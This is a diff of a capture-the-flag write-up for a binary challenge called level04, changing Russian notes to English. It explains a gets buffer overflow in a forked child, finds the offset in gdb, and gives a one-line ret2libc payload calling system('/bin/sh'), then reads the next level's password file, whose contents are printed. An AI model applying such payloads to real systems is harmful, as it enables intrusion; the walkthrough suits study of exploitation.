@@ -1,26 +1,41 @@
-По псевдокоду ясно, что у нас есть уязвимость с возможностью переполнения gets.
+level04
 
-Запускаем gdb и устанавливаем параметр set follow-fork-mode child.
-Теперь мы можем получить сегу при переполнении буфера и увидеть адрес памяти на котором все поломалось.
+Basically, this program declares a buffer of 32 bytes, then calls fork to create a child process :
 
-Благодаря сайту https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
-генерируем длиную строку, которая явно превышает буфер.
-После сеги получаем адрес памяти по которому определяем смещение
-для вызова system через указание адреса памяти.
+In the child process, ptrace is used to make the process trackable, puts displays the hint "Give me some shellcode, k", then gets is called to fill the buffer.
 
-Нам нужны 2 адреса:
-- функция libc system().
-- строка '/bin/sh'.
+In order to debug, some additional options have to be used to follow the child process:
 
-gdb поможет их найти:
+ltrace -f
+(gdb) set follow-fork-mode child
 
+In the same time, the parent process wait for a status update from the child. If it receives a SIGCHLD, meaning the child process has exited, it returns too. Otherwise, it uses ptrace to monitor the syscalls done by the child process, especially looking for an exec call. If it catchs one, it kills the process and returns.
+
+From here, we know that we have to design a shellcode that does not use any call to exec, and obviously find a way to jump to it. The use of gets inside the child process seems to be a good entrypoint for a buffer overflow attack.
+
+gdb level04
+(gdb) set follow-fork-mode child
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level04/level04
+[New process 2067]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 2067]
+0x41326641 in ?? ()
+
+Lets find libc system() function and string "/bin/sh" in memory using gdb.
 p system
 0xf7e6aed0
 
 find __libc_start_main,+99999999,"/bin/sh"
 0xf7f897ec
 
-Используем эти адреса и немного мусора.
-
 (python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + '\xff\xff\xff\xff' + '\xec\x97\xf8\xf7'" ; cat) | ./level04
+
 cat /home/users/level05/.pass
+
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
